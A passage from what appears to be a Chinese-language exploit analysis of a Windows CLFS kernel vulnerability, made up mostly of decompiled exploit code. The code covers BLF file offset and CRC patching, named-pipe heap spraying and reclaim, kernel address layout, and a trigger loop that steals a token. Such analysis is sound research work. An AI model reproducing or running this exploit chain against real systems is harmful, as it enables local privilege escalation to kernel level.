style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(Filew,<span style="color:#ae81ff">0x858</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> Buffer<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5000000</span>;</span></span><span style="display:flex;"><span> v7<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(v7,<span style="color:#ae81ff">0x1DF8</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(v7,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">4u</span>, NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E775CF</span>(<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#e6db74">L</span><span style="color:#e6db74">"Error</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v7);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0x800</span>i64,<span style="color:#ae81ff">0x7A00</span>i64);</span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v13);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>unk_7FF662B44110,<span style="color:#ae81ff">0x8200</span>i64,<span style="color:#ae81ff">0x7A00</span>i64);</span></span><span style="display:flex;"><span> dword_7FF662B449B8<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">0x7A00</span>,<span style="color:#e6db74">"Clfs"</span>,<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">0</span>i64);<span style="color:#75715e">// 查询堆内信息</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> v14<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(pszLogFileName,<span style="color:#ae81ff">0xC0010000</span>,<span style="color:#ae81ff">3u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);<span style="color:#75715e">// LOG:C:\\\\Users\\\\Public\\\\MyLog_%08d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">sub_7FF662B21B80</span>(<span style="color:#ae81ff">0x7A00</span>,<span style="color:#e6db74">"Clfs"</span>,<span style="color:#ae81ff">0</span>, (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span><span style="color:#f92672">*</span>)NumberOfBytesWritten);<span style="color:#75715e">// NumberOfBytesWritten 指向了最后一个clfs池，也就是最后一个clfs 基本块的地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">"pause"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> MyLog__08d_base_block<span style="color:#f92672">=</span><span style="color:#f92672">*</span>(_QWORD<span style="color:#f92672">*</span>)NumberOfBytesWritten;</span></span><span style="display:flex;"><span> hLog<span style="color:#f92672">=</span> v14;</span></span><span style="display:flex;"><span><span style="color:#a6e22e">wsprintf</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">::</span>pszLogFileName, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">"%s"</span>, pszLogFileName);</span></span><span style="display:flex;"><span> pcbContainer[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">512</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> ((<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span><span style="color:#f92672">*</span>)(HANDLE, ULONGLONG<span style="color:#f92672">*</span>, WCHAR<span style="color:#f92672">*</span>, _QWORD))AddLogContainer)(</span></span><span style="display:flex;"><span> hLog,</span></span><span style="display:flex;"><span> pcbContainer,</span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span>pwszContainerPath,</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>之后通过CreateLogFile创建10个日志文件，并修改以下偏移，这里将其称之为副blf文件。</p><pre tabindex="0"><code>读取0-0x400到缓冲区并将以下偏移的值修改
0x70 -> 0 4字节
0x06 -> 2 4字节
而后将这个缓冲区写入到偏移0x400处
0x06 -> 0x1 4字节
0x0c -> crc32 4字节
0x70 -> 0x2 4字节
0x84 -> 0x2 4字节
0x88 -> 0x4 4字节
0x8A -> 0x4 4字节
0x90 -> 0x1 4字节
0x94 -> 0x3 4字节
0x9C -> 0x2 4字节
0x406 -> 2 4字节
0x40c -> crc32
0x470 -> 0 4字节
0x484 -> 0x2 4字节
0x488 -> 0x13 4字节
0x48A -> 0x13 4字节
0x1B98 -> 0x65C8
0x80c -> crc32
0x820c -> crc32
0x9598 -> 0x65C8</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">fun_tigger</span>(<span style="color:#66d9ef">const</span> WCHAR<span style="color:#f92672">*</span>a1,<span style="color:#66d9ef">__int64</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> DWORD NumberOfBytesWritten;<span style="color:#75715e">// [rsp+44h] [rbp-14h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E7B416</span>(a2);</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(a1,<span style="color:#ae81ff">0xC0000000</span>,<span style="color:#ae81ff">1u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);<span style="color:#75715e">// LOG:C:\\\\Users\\\\Public\\\\MyLog%d%08d</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ( LogFile<span style="color:#f92672">==</span> (HANDLE)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>i64 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(LogFile);</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span><span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x400u</span>i64);</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>(a2,<span style="color:#ae81ff">0x800</span>,<span style="color:#ae81ff">0x7A00u</span>);</span></span><span style="display:flex;"><span> v19<span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">CreateFilew</span>(a2,<span style="color:#ae81ff">0xC0000000</span>i64,<span style="color:#ae81ff">7</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">128</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">SetFilePointer</span>(v19,<span style="color:#ae81ff">0x9598</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">1u</span>);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(v19,<span style="color:#f92672">&amp;</span>Buffer,<span style="color:#ae81ff">4u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E775CF</span>(<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0</span>i64,<span style="color:#e6db74">L</span><span style="color:#e6db74">"Error</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n"</span>,<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v19);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CrcPatchFile</span>(a2,<span style="color:#ae81ff">0x8200</span>,<span style="color:#ae81ff">0x7A00u</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">free</span>(v5);</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>使用匿名管道进行堆布局，通过调用func_pipespray并两次分别传入0x5000和0x4000来申请0x5000对和0x4000对匿名pipe，</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE<span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">func_pipespray</span>(<span style="color:#66d9ef">int</span> a1)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> v2;<span style="color:#75715e">// of</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">size_t</span> v3;<span style="color:#75715e">// rcx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> HANDLE<span style="color:#f92672">*</span>v4;<span style="color:#75715e">// rbx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v5;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v6;<span style="color:#75715e">// esi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int64</span>)(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)a1<span style="color:#f92672">>></span><span style="color:#ae81ff">28</span><span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)(<span style="color:#ae81ff">16</span><span style="color:#f92672">*</span> a1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( v2 )</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>i64;</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">=</span> (HANDLE<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(v3);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>v4 )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v5)<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( a1<span style="color:#f92672">></span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">CreatePipe</span>((<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v4[v6], (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>v4[v6<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">0x60</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v5<span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)v5;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">></span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>v4);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(v4[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> v4<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v5;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v5 );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B227AE</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#a6e22e">LODWORD</span>(v5)<span style="color:#f92672">=</span> v5<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;</span></span><span style="display:flex;"><span> v6<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( (<span style="color:#66d9ef">int</span>)v5<span style="color:#f92672">&lt;</span> a1 );</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> v4;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>首先遍历0x5000对pipe的pipe_array_a，并通过WriteFile写入长度为12的指针数组，其内容为第一个日志文件的base block。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Buffer[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">6</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">7</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span> Buffer[<span style="color:#ae81ff">11</span>]<span style="color:#f92672">=</span> MyLog__08d_base_block<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span>;</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64; j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x5000</span>;<span style="color:#f92672">++</span>j )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v46, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_a);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_a[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_a<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v42;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v42 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B243B7</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v46<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span></code></pre></div><p>而后从第0x1000对开始，释放0x667对pipe，释放结束后创建日志文件对释放后的内存进行占位</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64; j<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x5000</span>;<span style="color:#f92672">++</span>j )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v46, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>NumberOfBytesWritten,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_a);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_a[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_a<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v42;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v42 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">JUMPOUT</span>(<span style="color:#ae81ff">0x7FF662B243B7</span>i64);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v46<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> v48<span style="color:#f92672">=</span> pipe_array_a<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2000</span>;</span></span><span style="display:flex;"><span> v49<span style="color:#f92672">=</span><span style="color:#ae81ff">0x667</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>v48);<span style="color:#75715e">// 释放Pipe</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#a6e22e">CloseHandle</span>(v48[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> v48<span style="color:#f92672">+=</span><span style="color:#ae81ff">10</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v49;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v49 );</span></span><span style="display:flex;"><span> v50<span style="color:#f92672">=</span><span style="color:#ae81ff">0xA</span>i64;</span></span><span style="display:flex;"><span> v51<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span> v52<span style="color:#f92672">=</span><span style="color:#ae81ff">0xA</span>i64;</span></span><span style="display:flex;"><span> v53<span style="color:#f92672">=</span> pszLogFileName;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> LogFile<span style="color:#f92672">=</span><span style="color:#a6e22e">CreateLogFile</span>(v53,<span style="color:#ae81ff">0xC0000000</span>,<span style="color:#ae81ff">1u</span>,<span style="color:#ae81ff">0</span>i64,<span style="color:#ae81ff">4u</span>,<span style="color:#ae81ff">0</span>);</span></span><span style="display:flex;"><span> v53<span style="color:#f92672">+=</span><span style="color:#ae81ff">256</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>v51<span style="color:#f92672">++</span><span style="color:#f92672">=</span> LogFile;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v52;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v52 );</span></span></code></pre></div><p>占位结束后，对第二次申请的0x4000对pipe_array_b调用WriteFile写入指针数组，而后对0x5000030处内存进行布局，循环尝试触发漏洞，首先为创建的10个副blf文件添加log container，在每次添加容器之后，通过CreateLogFile打开主blf文件的句柄（第一个创建的日志文件。）而后尝试通过NtFsControlFileAddress函数读取token，在读取之后判断token有效性，有效则退出循环。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(<span style="color:#f92672">*</span>v56, Buffer,<span style="color:#ae81ff">0x60u</span>,<span style="color:#f92672">&amp;</span>v87,<span style="color:#ae81ff">0</span>i64) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span></span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(<span style="color:#f92672">*</span>pipe_array_b);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CloseHandle</span>(pipe_array_b[<span style="color:#ae81ff">1</span>]);</span></span><span style="display:flex;"><span> pipe_array_b<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#f92672">--</span>v43;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v43 );</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sub_7FF662E77D93</span>(<span style="color:#ae81ff">1</span>i64);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__debugbreak</span>();</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#f92672">++</span>v55;</span></span><span style="display:flex;"><span> v56<span style="color:#f92672">+=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ( v55<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x4000</span> );</span></span><span style="display:flex;"><span> pcbContainer<span style="color:#f92672">=</span><span style="color:#ae81ff">512</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( versionFlag )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v57<span style="color:#f92672">=</span> Size;</span></span><span style="display:flex;"><span> v58<span style="color:#f92672">=</span> hObject;</span></span><span style="display:flex;"><span> v59<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span> )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">AddLogContainer</span>(<span style="color:#f92672">*</span>v58,<span style="color:#f92672">&amp;</span>pcbContainer, (LPWSTR)<span style="color:#f92672">&amp;</span>v97[<span style="color:#ae81ff">256</span><span style="color:#f92672">*</span> (<span style="color:#66d9ef">__int64</span>)v59],<span style="color:#ae81ff">0</span>i64);</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000030</span>]<span style="color:#f92672">=</span> qword_7FF662B44710;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5000000</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">0x5001000</span>i64;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001000</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001010</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001018</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> ......</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x50011F8</span>]<span style="color:#f92672">=</span> ClfsEarlierLsnKernelAddress;</span></span><span style="display:flex;"><span> MEMORY[<span style="color:#ae81ff">0x5001008</span>]<span style="color:#f92672">=</span> 